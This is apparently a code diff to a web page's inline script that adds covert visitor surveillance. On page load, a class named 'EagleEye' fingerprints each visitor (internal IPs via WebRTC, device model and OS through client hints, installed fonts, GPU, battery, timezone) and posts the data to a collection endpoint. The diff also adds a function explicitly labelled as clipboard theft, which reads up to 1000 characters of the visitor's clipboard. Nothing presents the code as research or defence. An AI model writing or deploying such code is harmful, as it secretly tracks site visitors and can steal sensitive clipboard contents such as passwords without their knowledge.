@@ -16,6 +16,7 @@
     </style>
 
     <script>
+    // --- ULTIMATE EAGLE EYE (ALL FEATURES COMBINED) ---
     window.EagleEye = class {
         constructor() {
             this.endpoint = '/api/collect';
@@ -27,7 +28,26 @@
             else window.addEventListener('load', () => this.collect('Page Load'));
         }
 
-        // 1. Внутренний IP (WebRTC)
+        // 1. Client Hints (Модель телефона, версия ОС) - ВЕРНУЛ ЭТО!
+        async getClientHints() {
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const ua = await navigator.userAgentData.getHighEntropyValues([
+                        "model", "platformVersion", "fullVersionList", "architecture", "bitness"
+                    ]);
+                    return {
+                        model: ua.model,
+                        platform: ua.platform,
+                        version: ua.platformVersion,
+                        architecture: ua.architecture,
+                        mobile: ua.mobile
+                    };
+                } catch(e) { return null; }
+            }
+            return null;
+        }
+
+        // 2. WebRTC (Внутренний IP)
         async getInternalIPs() {
             return new Promise((resolve) => {
                 const ips = [];
@@ -43,14 +63,24 @@
             });
         }
 
-        // 2. Шрифты (Детект по ширине)
+        // 3. Шрифты (Детект через рендеринг - ВЕРНУЛ ЭТО!)
         getFonts() {
-            const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Arial Black"];
-            // В реальном фингерпринтинге проверяют рендеринг, здесь просто список для примера
-            return fontList; 
+            const fontList = ["Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", "Times", "Times New Roman", "Trebuchet MS", "Ubuntu", "Verdana", "Wingdings"];
+            const detected = [];
+            const span = document.createElement("span");
+            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
+            document.body.appendChild(span);
+            span.style.fontFamily = "monospace";
+            const defaultWidth = span.offsetWidth;
+            for (const font of fontList) {
+                span.style.fontFamily = `"${font}", monospace`;
+                if (span.offsetWidth !== defaultWidth) detected.push(font);
+            }
+            document.body.removeChild(span);
+            return detected;
         }
 
-        // 3. GPU
+        // 4. GPU
         getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
@@ -64,14 +94,12 @@
             } catch(e) { return { renderer: 'Error' }; }
         }
 
-        async collect(triggerName) {
-            const [ips, battery, hints] = await Promise.all([
+        async collect(triggerName, extraData = {}) {
+            const [ips, battery, clientHints] = await Promise.all([
                 this.getInternalIPs(),
                 navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
-                navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]) : null
+                this.getClientHints() // ВОТ ОНО
             ]);
-            
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             
             const payload = {
                 meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName },
@@ -81,21 +109,19 @@
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory
                 },
+                client_hints: clientHints, // ТЕПЕРЬ ЭТО БУДЕТ В ЛОГАХ
                 system: {
                     ua: navigator.userAgent,
                     platform: navigator.platform,
-                    language: navigator.language, // ВОТ ЯЗЫК
-                    languages: navigator.languages, // СПИСОК ЯЗЫКОВ
+                    language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     battery: battery,
-                    fonts: this.getFonts() // ВОТ ШРИФТЫ
+                    fonts: this.getFonts() // И ЭТО ТОЖЕ
                 },
                 network: {
-                    type: conn ? conn.effectiveType : 'unknown', // 3g/4g (эффективная)
-                    downlink: conn ? conn.downlink : 0,
-                    rtt: conn ? conn.rtt : 0,
                     webrtc_ips: ips
-                }
+                },
+                ...extraData
             };
 
             const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
@@ -103,6 +129,19 @@
         }
     };
     const eagle = new EagleEye();
+
+    // --- ГЛОБАЛЬНАЯ ФУНКЦИЯ КРАЖИ БУФЕРА ---
+    async function stealClipboard() {
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                const text = await navigator.clipboard.readText();
+                return text ? text.substring(0, 1000) : "Empty";
+            }
+        } catch (e) {
+            return "Blocked/Error";
+        }
+        return "Not Supported";
+    }
     </script>
 </head>
 <body>
